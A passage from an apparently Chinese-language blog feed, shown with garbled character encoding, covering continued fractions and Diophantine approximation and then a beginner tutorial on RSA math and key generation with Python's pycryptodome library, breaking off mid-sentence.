href="#æœ€ä½³è¿‘ä¼¼å€¼-amp-ä¸¢ç•ªå›¾é€¼è¿‘-Diophantine-approximation" class="headerlink" title="æœ€ä½³è¿‘ä¼¼å€¼&amp;ä¸¢ç•ªå›¾é€¼è¿‘(Diophantine approximation)"></a>æœ€ä½³è¿‘ä¼¼å€¼&amp;ä¸¢ç•ªå›¾é€¼è¿‘(Diophantine approximation)</h3><p><strong>æœ€ä½³è¿‘ä¼¼å€¼å®šä¹‰</strong>ï¼šåœ¨æ•°è½´ä¸Šï¼Œå¦‚æœä¸å…¶ä»–æœ‰ç†æ•°ç›¸æ¯”ï¼Œ$\frac pq$ ($p$å’Œ$q$ æ²¡æœ‰å…¬å› å­)åˆ°å®æ•°$x$ çš„è·ç¦»æ›´è¿‘ï¼Œé‚£ä¹ˆ$\frac pq$å°±å«ä½œ$x$ çš„æœ€ä½³è¿‘ä¼¼å€¼(<strong>åªè€ƒè™‘åˆ†æ¯å¤§å°ä¸è¶…è¿‡qçš„æœ‰ç†æ•°</strong>)</p><p><strong>å®šç†</strong>ï¼š$\text{è®¾ }x=[a_0,a_1,â€¦]\text{,åœ¨åˆ†æ¯ä¸è¶…è¿‡ }q_t\text{ çš„æœ‰ç†æ•°ä¸­,}\\\text{ç¬¬}t\text{ä¸ªæ¸è¿›åˆ†æ•° }\frac{p_t}{q_t}\text{ æ˜¯ å®æ•° }x\text{ çš„æœ€ä½³è¿‘ä¼¼å€¼ã€‚}$(è¯æ˜ç•¥)</p><p><strong>ä¸€ä¸ªå®æ•°æ‰€æœ‰çš„æ¸è¿›åˆ†æ•°éƒ½æ˜¯ä»–çš„æœ€ä½³è¿‘ä¼¼å€¼</strong>(åˆ†æ¯ä¸è¶…è¿‡æ¸è¿›åˆ†æ•°çš„åˆ†æ¯çš„å…¨éƒ¨æœ‰ç†æ•°èŒƒå›´å†…)</p><p><strong>å®æ•°çš„æœ€ä½³è¿‘ä¼¼å€¼ä¸åªæœ‰å®ƒçš„æ¸è¿›åˆ†æ•°</strong></p><h4 id="åŠæ¸è¿›åˆ†æ•°-semi-convergent-æ¬¡æ¸è¿›åˆ†æ•°-secondary-convergent"><a href="#åŠæ¸è¿›åˆ†æ•°-semi-convergent-æ¬¡æ¸è¿›åˆ†æ•°-secondary-convergent" class="headerlink" title="åŠæ¸è¿›åˆ†æ•°(semi-convergent)(æ¬¡æ¸è¿›åˆ†æ•°(secondary convergent))"></a>åŠæ¸è¿›åˆ†æ•°(semi-convergent)(æ¬¡æ¸è¿›åˆ†æ•°(secondary convergent))</h4><p><strong>å®šä¹‰</strong>ï¼šè®¾ $x=[a_0,a_1,â€¦],\frac{p_t}{q_t}$ å’Œ$\frac{p_{t+1}}{q_{t+1}}$æ˜¯xçš„ä¸¤ä¸ªç›¸é‚»çš„æ¸è¿›åˆ†æ•°ï¼Œåˆ™<br>$\frac{p_t\:+\:r\:p_{t+1}}{q_t\:+\:r\:q_{t+1}}\quad(r\in\mathbb{Z},\:0\leq r\leq a_t)$,ç§°ä½œ$x$çš„åŠæ¸è¿›åˆ†æ•°ã€‚</p><ul><li><p><strong>æ¸ è¿› åˆ† æ•° ä¹Ÿ æ˜¯ åŠ æ¸ è¿› åˆ† æ•°</strong></p></li><li><p><strong>å®æ•°çš„æœ€ä½³è¿‘ä¼¼å€¼åªå­˜åœ¨äºåŠæ¸è¿›åˆ†æ•°é‡Œç¬¬tä¸ªå’Œç¬¬t+2ä¸ªæ¸è¿›åˆ†æ•°ä¹‹é—´ï¼Œå¤§çº¦æœ‰ä¸€åŠçš„â€œåŠæ¸è¿›åˆ†æ•°â€æ˜¯æœ€ä½³è¿‘ä¼¼å€¼</strong></p></li><li><p><strong>$a^t$å¯ä»¥ç”¨æ¥åº¦é‡â€œé€¼è¿‘â€çš„ç¨‹åº¦ï¼Œè¡¨ç¤ºæ¸è¿›åˆ†æ•°ç¦»å®æ•°ç©¶ç«Ÿæœ‰å¤šè¿‘ã€‚<br>$a^t$è¶Šå¤§ï¼Œæ¸è¿›åˆ†æ•°å°±æ›´é€¼è¿‘å®æ•°ã€‚</strong></p></li></ul><h3 id="è¿åˆ†æ•°çš„ç›¸åæ•°"><a href="#è¿åˆ†æ•°çš„ç›¸åæ•°" class="headerlink" title="è¿åˆ†æ•°çš„ç›¸åæ•°"></a>è¿åˆ†æ•°çš„ç›¸åæ•°</h3><p>ç®€å•è¿åˆ†æ•°ä¸­ï¼Œåªæœ‰$a_0$å¯ä¸ºéæ­£æ•´æ•°(0,$\pm$)</p><h4 id="ç®€å•è¿åˆ†æ•°è¡¨ç¤ºè´Ÿæ•°"><a href="#ç®€å•è¿åˆ†æ•°è¡¨ç¤ºè´Ÿæ•°" class="headerlink" title="ç®€å•è¿åˆ†æ•°è¡¨ç¤ºè´Ÿæ•°"></a>ç®€å•è¿åˆ†æ•°è¡¨ç¤ºè´Ÿæ•°</h4><p><strong>ç»™å®æ•°</strong></p><script type="math/tex; mode=display">x=-X-F(0<F<1)\\=(-X-1)+(1-F)\\=[a_0-X-1,a_1,...]</script><p>$1-F=[a_0,a_1,â€¦]$</p><p><strong>ç»™ç®€å•è¿åˆ†æ•°</strong></p><p>$x=[a_0,a_1,a_2,â€¦]$</p><p>$-x=[-a_0-1,1,a_1-1,a_2,â€¦]$</p><blockquote><p>PS:<script type="math/tex">è‹¥ä¸­é—´å‡ºç°0ï¼Œ[...,a_{t-1},a_t,0,a_{t+1},a_{t+2},...],åˆ™-x=[...,a_{t-1},a_t+a_{t+1},a_{t+2},...]</script></p><script type="math/tex; mode=display">è‹¥æœ«å°¾å‡ºç°0ï¼Œ[\ldots,a_{n-2},a_{n-1},0],åˆ™-x=[\ldots,a_{n-2}]</script></blockquote><h3 id="æ™®é€šè¿åˆ†æ•°-general-continued-fraction"><a href="#æ™®é€šè¿åˆ†æ•°-general-continued-fraction" class="headerlink" title="æ™®é€šè¿åˆ†æ•°(general continued fraction)"></a>æ™®é€šè¿åˆ†æ•°(general continued fraction)</h3><p>$a_0+\frac{b_1}{a_1+\frac{b_2}{a_2+\frac{b_3}{â€¦}}}$<br>$b_i$æ˜¯æ­£æ•´æ•°</p><h3 id="è¿åˆ†æ•°çš„åº”ç”¨"><a href="#è¿åˆ†æ•°çš„åº”ç”¨" class="headerlink" title="è¿åˆ†æ•°çš„åº”ç”¨"></a>è¿åˆ†æ•°çš„åº”ç”¨</h3><p>å¤©æ–‡å†æ³•ï¼Œæ¤ç‰©å­¦ä¸Šæ ‘å¶åœ¨èŒä¸Šçš„æ’åˆ—è§„å¾‹ï¼ŒéŸ³ä¹é¢†åŸŸ</p><p>å¯†ç å­¦ä¸Šï¼Œè‘—åçš„<strong>RSAç®—æ³•</strong></p><hr><h1 id="å®Œç»“æ’’èŠ±"><a href="#å®Œç»“æ’’èŠ±" class="headerlink" title="å®Œç»“æ’’èŠ±"></a>å®Œç»“æ’’èŠ±</h1><p>â˜…,Â°<em>:.â˜†(ï¿£â–½ï¿£)/$:</em>.Â°â˜…<em> ã€‚<em>*çˆ±æ¥è‡ªğŸ˜½C.A.TğŸ˜¸å–µ</em></em></p>]]></content>
      
      
      <categories>
          
          <category> Cryptoæ•°å­¦åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> æ•°è®º </tag>
            
            <tag> ç­‘åŸºç¯‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç ç®—æ³•ç¯‡Â·RSA</title>
      <link href="/2023/10/28/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7RSA/"/>
      <url>/2023/10/28/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E7%AF%87%C2%B7RSA/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><ul><li><p><strong>äº’è´¨</strong>ï¼šä¸¤ä¸ª<strong>æ­£æ•´æ•°</strong>åªæœ‰<strong>ä¸€ä¸ªå…¬å› æ•°1</strong>æ—¶ï¼Œåˆ™ç§°å…¶ä¸ºäº’è´¨ã€‚</p></li><li><p><strong>æ¬§æ‹‰å‡½æ•°$\varphi(N)$</strong>:å°äºæˆ–ç­‰äº$N$çš„æ­£æ•´æ•°ä¸­ä¸$N$äº’è´¨çš„æ•°çš„<strong>ä¸ªæ•°</strong></p><p><strong>è‹¥$p$ä¸ºç´ æ•°ï¼Œåˆ™$\varphi(p)=p-1$ (å› ä¸ºæ¯ä¸€ä¸ªå°äº$p$çš„æ•°éƒ½ä¸$p$äº’è´¨ã€‚)</strong></p><p>ç”±æ­¤æˆ‘ä»¬æœ‰åœ¨RSAä¸­ï¼Œ$\varphi(N)=(p-1)(q-1)$</p></li><li><p><strong>ä¹˜æ³•é€†å…ƒ</strong>ï¼š</p><p>åœ¨åŠ æ³•ä¸­ï¼Œæˆ‘ä»¬æœ‰$a+(-a)=0$,æˆ‘ä»¬ç§°å…¶äº’ä¸ºç›¸åæ•°ã€‚</p><p>åœ¨ä¹˜æ³•ä¸­ï¼Œæˆ‘ä»¬æœ‰$a\cdot(1/a)=1$,æˆ‘ä»¬ç§°å…¶äº’ä¸ºå€’æ•°ï¼Œä½†æ˜¯å…¶å®æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ç§°å‘¼ï¼šé€†å…ƒï¼Œå³æŸç§è¿ç®—ä¸‹çš„é€†å…ƒç´ ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œå…ƒç´ å’Œå…¶é€†å…ƒç´ è¿›è¡Œè¿ç®—ä¹‹åæ€»æ˜¯ä¸€ä¸ªå®šå€¼</p><p>å®é™…ä¸Šåœ¨ä»£æ•°ä¸­ï¼Œä»–ä»¬æ„æˆäº†ä¸€ä¸ªç¾¤(ä¸ç”¨æ·±ç©¶),è€Œæˆ‘ä»¬è¿›è¡Œè¦äº†è§£åˆ™æ˜¯åœ¨æ¨¡æ„ä¹‰ä¸‹çš„ä¹˜æ³•é€†å…ƒåœ¨æ¨¡$p$æ„ä¹‰ä¸‹ï¼ŒæŒ‡çš„æ˜¯åç»­çš„æ‰€æœ‰è¿ç®—éƒ½æ˜¯åœ¨æ¨¡$p$çš„æ¡ä»¶ä¸‹æ»¡è¶³ï¼Œä¾‹å¦‚$3\cdot4\neq1$ä½†$(3\cdot4) mod\ 11=(1) mod\ 11$,å¯¹äºè¿™ç§å¼å­æˆ‘ä»¬ç§°å…¶ä¸º<strong>åŒä½™å¼</strong>ï¼Œå¹¶ä¸”æœ‰ä¸“é—¨çš„åŒä½™ç¬¦å·è¿›è¡Œè¡¨ç¤º<script type="math/tex">3\cdot4\equiv1\quad(\mathrm{mod~}11)</script><br>æ‰€ä»¥å‚è€ƒä¸Šé¢ä¹˜æ³•ä¸­çš„é€†å…ƒè¿ç®—è§„åˆ™ï¼Œåœ¨æ¨¡æ„ä¹‰ä¸‹åˆ™æœ‰</p><script type="math/tex; mode=display">a\cdot a^{-1}\equiv1\quad(\mathrm{mod~}p)</script><p>æˆ‘ä»¬ç§°$a$å’Œ$a^{-1}$äº’ä¸ºåœ¨æ¨¡$p$æ„ä¹‰ä¸‹çš„ä¹˜æ³•é€†å…ƒã€‚ä¾‹å¦‚ä¸Šè¿°ä¸­çš„ 3 ä¸ 4 äº’ä¸ºåœ¨æ¨¡ 11 ä¸‹çš„ä¹˜æ³•é€†å…ƒã€‚</p></li><li><p><strong>æ¬§æ‹‰å®šç†</strong>ï¼š<script type="math/tex">è®¾a\in \mathbb{Z_n^{*}},åˆ™a^{\phi(n)}\equiv1\pmod n</script></p><p>$ä¸”k\mid \phi(n),å…¶ä¸­kæ˜¯aåœ¨æ¨¡nä¸‹çš„é˜¶$</p><p><strong>$a^{\phi(p)}\equiv 1\pmod p$</strong></p><p><strong>$a^{p-1}\equiv 1\pmod p$</strong></p><p>ä¸¤è¾¹éƒ½ä¹˜a</p><p>å¾—åˆ°$a^p\equiv a\pmod p$</p><p>å³<strong>è´¹é©¬å°å®šç†</strong>$(å¯¹äºä»»æ„ç´ æ•°på’Œæ•´æ•°a\in \mathbb{Z_p},éƒ½æœ‰a^p\equiv a\pmod p)$</p></li></ul><h2 id="ç”Ÿæˆå…¬ç§é’¥"><a href="#ç”Ÿæˆå…¬ç§é’¥" class="headerlink" title="ç”Ÿæˆå…¬ç§é’¥"></a>ç”Ÿæˆå…¬ç§é’¥</h2><ol><li><p>é€‰å–ä¸¤ä¸ªä¸åŒçš„å¤§ç´ æ•°$p$å’Œ$q$ ,è®¡ç®—$N=p\cdot q$ ã€‚</p></li><li><p>æ±‚æ¬§æ‹‰å‡½æ•°å€¼$\varphi(N)=\varphi(p)\varphi(q)=(p-1)(q-1)$ã€‚</p></li><li><p>é€‰æ‹©ä¸€ä¸ªå°äº$\varphi(N)$çš„æ•´æ•°$e$ ,å¹¶ä¸”æ»¡è¶³$e$å’Œ$\varphi ( N) \textbf{äº’ è´¨ , æ±‚ å¾— }e$åœ¨æ¨¡$\varphi(N)$æ„ä¹‰ä¸‹çš„ä¹˜æ³•é€†å…ƒ$d$ ,æœ‰$ed\equiv1$ (mod $\varphi ( N) )$</p></li><li><p>é”€æ¯$p$å’Œ$q$ ã€‚</p></li></ol><p><strong>æ­¤æ—¶æœ‰$(N,e)$ä¸ºå…¬é’¥ï¼Œ$(N,d)$ä¸ºç§é’¥ã€‚</strong></p><h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><p>é¦–å…ˆéœ€è¦å°†æ¶ˆæ¯ï¼Œä»¥ä¸€ä¸ªåŒæ–¹çº¦å®šå¥½çš„æ ¼å¼è½¬åŒ–ä¸ºä¸€ä¸ªå°äº$N$çš„æ•´æ•°$m$ã€‚å¦‚æœæ¶ˆæ¯å¤ªé•¿ï¼Œå¯ä»¥å°†æ¶ˆæ¯åˆ†ä¸ºå‡ æ®µï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„å—åŠ å¯†ï¼Œåå¯¹äºæ¯ä¸€éƒ¨åˆ†åˆ©ç”¨å¦‚ä¸‹å…¬å¼åŠ å¯†ï¼š<script type="math/tex">c=m^e\quad(\mathrm{mod~}N)</script><br>æ­¤æ—¶å¾—åˆ°çš„$c$ä¾¿æ˜¯æˆ‘ä»¬çš„å¯†æ–‡ã€‚</p><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><p>åŠ å¯†æ—¶æˆ‘ä»¬åªç”¨åˆ°äº†å…¬é’¥$(N,e)$,åŒç†è§£å¯†æ—¶æˆ‘ä»¬ä¹Ÿåªéœ€ç”¨åˆ°ç§é’¥$(N,d)$ã€‚æœ‰</p><script type="math/tex; mode=display">m= c^d\quad(\mathrm{mod~}N)</script><p>æ­¤æ—¶å¾—åˆ°çš„$m$ä¾¿æ˜¯æˆ‘ä»¬çš„æ˜æ–‡æ¶ˆæ¯ã€‚</p><h2 id="æ­£ç¡®æ€§è¯æ˜"><a href="#æ­£ç¡®æ€§è¯æ˜" class="headerlink" title="æ­£ç¡®æ€§è¯æ˜"></a>æ­£ç¡®æ€§è¯æ˜</h2><p>è½¬æ¢ä¸ºè¯æ˜<br>$m\equiv c^d$<br>$\equiv(m^e)^d$<br>$\equiv m^{ed}$ (mod $N)$<br>åˆæœ‰ $ed\equiv1$ (mod $\varphi(N))$,å³$ed=1+k\varphi(N)$ã€‚</p><ol><li>è‹¥$gcd(m,N)=1$,åˆ™$m^{ed}\equiv m^{ed- 1}\cdot m\equiv m^{k\varphi ( N) }\cdot m\equiv m$ (mod $N)$ã€‚åŸå¼å¾—è¯ã€‚</li></ol><ol><li>è‹¥$gcd(m,N)\neq1$,åˆ™$m$ä¸º$p$æˆ–$q$çš„æ•´æ•°å€ï¼Œè®¾$m=hp$,æœ‰<script type="math/tex; mode=display">\begin{aligned}m^{ed}&\equiv m^{ed-1}\\&\equiv m^{k(p-1)(q-1)}\cdot m\\&\equiv(1+xq)\cdot m\\&\equiv m+xq\cdot hp\\&\equiv m\quad(\mathrm{mod~}N)\end{aligned}</script>å…¶ä¸­<script type="math/tex; mode=display">m^{k(p-1)(q-1)}=(m^{k(p-1)})^{q-1}=1+xq</script>åŸå¼å¾—è¯ã€‚</li></ol><ol><li><p>ç”Ÿæˆä¸¤ä¸ªå¤§ç´ æ•°Pï¼ŒQã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªå¾ˆæ¨¡ç³Šçš„æ¦‚å¿µï¼Œæˆ‘å¸Œæœ›å„ä½åœ¨å­¦ä¹ ä¸­èƒ½å¤Ÿåšåˆ°å°½é‡ä¸¥è°¨ï¼Œå¾ˆæ˜¾ç„¶ï¼Œè¿™é‡Œå®šä¹‰çš„<code>å¤§ç´ æ•°</code>åˆ°åº•å¤šå¤§æ‰æ˜¯å¤§å‘¢ï¼Ÿ</p><p>10ç®—å¤§å—ï¼Ÿ100ç®—å—ï¼Ÿ10000ç®—å—ï¼Ÿè‘›ç«‹æ’æ•°ç®—å—ï¼Ÿ</p><p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ›´åŠ ç²¾ç¡®çš„è¯´æ³•ï¼Œæˆ‘ä»¬ç”Ÿæˆä¸¤ä¸ª512ä½çš„ç´ æ•°ï¼ˆè¿™é‡ŒåŒ…æ‹¬ä¹‹åçš„å†…å®¹ä¸­æ¶‰åŠåˆ°çš„<code>ä½</code>éƒ½æ˜¯æŒ‡äºŒè¿›åˆ¶ä½è€Œä¸æ˜¯åè¿›åˆ¶ï¼‰ï¼Œé‚£ä¹ˆå¦‚ä½•ä½¿ç”¨Pythonäº§ç”Ÿä¸€ä¸ªç´ æ•°å‘¢ï¼Œå¦‚æœä¸å€ŸåŠ©ä»»ä½•å¤–åŠ›çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ä»1å¼€å§‹é€‰æ‹©ï¼Œ2ï¼Œ3ï¼Œ4â€¦ç›´åˆ°æŸä¸ªæ•°æ»¡è¶³512ä½ä¸”ä¸ºç´ æ•°ä¸ºæ­¢ï¼Œä½†æ˜¯æ—¢ç„¶æˆ‘ä»¬éƒ½ä½¿ç”¨Pythonäº†ï¼Œä¸ºä½•è¿˜è¦è¿™æ ·åšå‘¢ï¼Ÿ</p><p>è®©æˆ‘ä»¬æ¥ä½¿ç”¨Pythonå¼ºå¤§çš„å¼€æºåº“<code>pycryptodome</code>ï¼Œä¸€èˆ¬æ¥è¯´ä½ åªéœ€è¦ä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip3 install pycryptodome</span><br><span class="line"><span class="comment"># æˆ–</span></span><br><span class="line">python3 -m pip install pycryptodome</span><br></pre></td></tr></table></figure><p>ä¾¿å¯ä»¥æˆåŠŸå®‰è£…ï¼Œç„¶ååœ¨Pythonç¯å¢ƒä¸­æ‰§è¡Œä»¥ä¸‹ä»£ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰æ˜¾ç¤º<code>ModuleNotFoundErrorï¼š</code>ç­‰è¯¸å¦‚æ­¤ç±»çš„é”™è¯¯è¯ï¼Œé‚£ä¹ˆæ­å–œä½ æˆåŠŸçš„å®‰è£…äº†æœ¬åº“ã€‚è¿™é‡Œä½ å¯èƒ½ä¼šå¥‡æ€ªä¸ºä»€ä¹ˆå®‰è£…ä½¿ç”¨<code>pycryptodome</code>ï¼Œè€Œå¼•å…¥æ—¶ä½¿ç”¨<code>Crypto</code>ï¼Œè¿™æ¶‰åŠåˆ°è¿™çš„åº“å’Œå…¶ä»–åº“çš„ä¸€äº›è”ç³»ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªè¡Œå»æŸ¥æ‰¾ã€‚</p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”Ÿæˆç´ æ•°äº†ï¼Œæˆ‘ä»¬å¼•å…¥åº“ä¸­çš„å­åŒ…<code>Crypto.Util.number</code>ï¼Œè¿™ä¸ªå­åŒ…ä¸­åŒ…å«äº†å¤§é‡çš„æ•°å­¦å·¥å…·ï¼Œä¹‹åæˆ‘ä»¬ä¼šç»å¸¸ç”¨åˆ°è¿™ä¸ªå­åŒ…ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¸Šé¢çš„ä»£ç ï¼Œä½ ä¾¿å¯ä»¥å¾—åˆ°ä¸¤ä¸ª512ä½çš„ç´ æ•°ï¼Œè¿™ä¾èµ–äºæˆ‘ä»¬è°ƒç”¨äº†åŒ…ä¸­çš„<code>getPrime</code>å‡½æ•°ï¼Œå®ƒèƒ½å¤Ÿè¿”å›ä¸€ä¸ª<code>n</code>ä½çš„ç´ æ•°ï¼Œå…¶ä¸­<code>n</code>æ˜¯æˆ‘ä»¬çš„ä¼ å…¥å‚æ•°ã€‚è‡³æ­¤æˆ‘ä»¬ä¾¿å®Œæˆäº†RSAçš„ç¬¬ä¸€æ­¥ã€‚</p></li><li><p>$n=pâ‹…q, Ï†(n)=(pâˆ’1)(qâˆ’1)$</p><p>åç»­çš„è¿‡ç¨‹ä¾¿ç®€å•äº†å¾ˆå¤šï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šå®Œæˆè¿ç®—å³å¯ï¼Œæ·»åŠ ä¸‹åˆ—ä»£ç å¹¶æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li><li><p>$é€‰å–ä¸Ï†(n)äº’ç´ çš„eï¼Œè®¡ç®—æ»¡è¶³edâ‰¡1(mod\ Ï†(n))$</p><p>è¿™é‡Œæˆ‘ä»¬è¦å®Œæˆä¸¤ä¸ªæ•°å­¦æ“ä½œï¼Œä¸€ä¸ªæ˜¯äº’ç´ çš„åˆ¤æ–­ï¼Œä¸€ä¸ªæ˜¯æ±‚è§£eçš„ä¹˜æ³•é€†å…ƒã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span>, <span class="string">&quot;è¯¥eä¸æ»¡è¶³äº’ç´ æ¡ä»¶&quot;</span></span><br><span class="line">d = inverse(e, phi)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>GCD</code>å‡½æ•°èƒ½å¤Ÿæ±‚è§£æœ€å¤§å…¬å› æ•°ï¼ˆGreatest Common Divisorï¼‰ï¼Œä¹‹å‰æˆ‘ä»¬å­¦ä¹ äº†äº’ç´ çš„æ¦‚å¿µå°±æ˜¯ä¸¤ä¸ªæ•°çš„æœ€å¤§å…¬å› æ•°ä¸º1ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç”¨æ–­è¨€è¡¨è¾¾å¼è®¤å®šeä¸€å®šæ˜¯å’Œphiäº’ç´ çš„ã€‚ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦é€‰æ‹©<code>65537</code>ä½œä¸º<code>e</code>å‘¢ï¼Œå®é™…ä¸Šè¿™å¹¶ä¸æ˜¯ç¡¬æ€§è§„å®šï¼Œä¸€äº›æ ‡å‡†æä¾›äº†ä¸€äº›eçš„å‚è€ƒå€¼ï¼Œ65537åœ¨å„ç±»å®ç°ä¸æ ‡å‡†ä¸­è¢«å¹¿æ³›ä½¿ç”¨ï¼Œä½†æ˜¯è¿™å¹¶ä¸å½±å“ä½ å¯ä»¥å°†å€¼æ”¹å˜ä¸ºå…¶ä»–å€¼è¿›è¡Œåç»­çš„æ“ä½œã€‚<br>æ±‚dçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†<strong><code>inverse</code>å‡½æ•°</strong>ï¼Œè¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°<code>(a,p)</code>ï¼Œä½œç”¨ä¾¿æ˜¯<strong>æ±‚è§£<code>a</code>åœ¨æ¨¡<code>p</code>æ„ä¹‰ä¸‹çš„ä¹˜æ³•é€†å…ƒ</strong>ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬ä¾¿æ˜¯æ±‚è§£<code>e</code>åœ¨æ¨¡<code>phi</code>ä¸‹é¢çš„ä¹˜æ³•é€†å…ƒï¼Œç»“æœä¸º<code>d</code>ã€‚ä¹‹å‰æˆ‘ä»¬æåˆ°äº†é€†å…ƒæ˜¯äº’ä¸ºé€†å…ƒï¼Œæ‰€ä»¥ä½ å¯ä»¥å°è¯•ä¸‹é¢çš„ä»£ç </p><p><code>print(inverse(d, phi) == e)</code></p><p>æ‰“å°çš„ç»“æœå°†ä¸º<code>True</code>ï¼Œä»è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨RSAä¸­çš„å…³é”®ç‚¹ä¾¿æ˜¯è·å–è¿™ä¸ª<code>phi</code>çš„å€¼ï¼Œå› ä¸ºå¾—åˆ°çš„<code>phi</code>æˆ‘ä»¬ä¾¿å¯ä»¥æ±‚<code>e</code>æˆ–<code>d</code>çš„å€¼ï¼Œè€Œè¿™æ­£æ˜¯æˆ‘ä»¬åŠ è§£å¯†çš„å¯†é’¥å‚æ•°ã€‚</p></li><li><p>$(n,e)$å³ä¸ºå…¬é’¥ï¼Œ$(n,d)$å³ä¸ºç§é’¥ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿å¾—åˆ°äº†ä¸€ç»„RSAçš„å…¬ç§é’¥ï¼Œéšåæˆ‘ä»¬ä¾¿å¯ä»¥å¼€å§‹ç”¨è¿™ç»„å¯†é’¥æ¥è¿›è¡ŒåŠ è§£å¯†æ“ä½œã€‚</p><p><strong>åŠ å¯†ï¼š</strong></p><p>å‡è®¾æˆ‘ä»¬è¦åŠ å¯†çš„æ¶ˆæ¯ä¸º<code>Hello</code>ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå­˜å‚¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œæˆ‘ä»¬å®šä¹‰çš„æ˜¯ä¸€ä¸ª<code>bytes</code>ç±»å‹å­—ç¬¦ä¸²ï¼Œå®ƒå°†æ¯ä¸ªå­—ç¬¦ç”¨8ä½äºŒè¿›åˆ¶è¿›è¡Œå­˜å‚¨ï¼Œæ˜¯å­—ç¬¦ä¸²æœ€åŸç”Ÿçš„å­˜å‚¨å½¢å¼ã€‚ä½ ä¹Ÿå¯ä»¥ç›´æ¥å®šä¹‰<code>&#39;hello&#39;</code>ï¼Œä½†åœ¨Python3ä¸­å®ƒæ˜¯ä¸€ä¸ªUnicodeçš„å­—ç¬¦ä¸²ï¼Œéœ€è¦è¿›è¡Œç¼–ç æ“ä½œæ‰èƒ½è½¬æ¢ä¸º<code>bytes</code>ç±»å‹è¿›è¡Œåç»­çš„è¿ç®—ã€‚</p><p>ä½†æˆ‘ä»¬åœ¨RSAä¸­æ˜¯æ•°ä¸æ•°çš„è¿ç®—ï¼Œè¯¥å¦‚ä½•å°†å­—ç¬¦ä¸²å‚ä¸æ“ä½œå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬ä½¿ç”¨åŒ…ä¸­çš„<code>bytes_to_long</code>å‡½æ•°ï¼Œä»å‡½æ•°åä¹Ÿå¯ä»¥çŒœå‡ºæ¥ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼Œè¿è¡Œä¸‹åˆ—ä»£ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬çš„æ¶ˆæ¯å·²ç»è¢«è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²äº†ã€‚éšåæˆ‘ä»¬ä¾¿å¯ä»¥å¯¹æ¶ˆæ¯è¿›è¡ŒRSAåŠ å¯†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨Pythonè‡ªå¸¦çš„<code>pow</code>å‡½æ•°è¿›è¡Œå¹‚è¿ç®—ï¼Œæ³¨æ„ä¸è¦å†™æˆ<code>m**e % n</code>ï¼ŒäºŒè€…ä»£è¡¨çš„æ„ä¹‰ç›¸åŒï¼Œä½†æ˜¯<code>pow</code>å‡½æ•°å†…ç½®å¿«é€Ÿå¹‚ï¼Œå¯ä»¥å¿«é€Ÿå¾—å‡ºç»“æœï¼Œè€Œ<code>m**e % 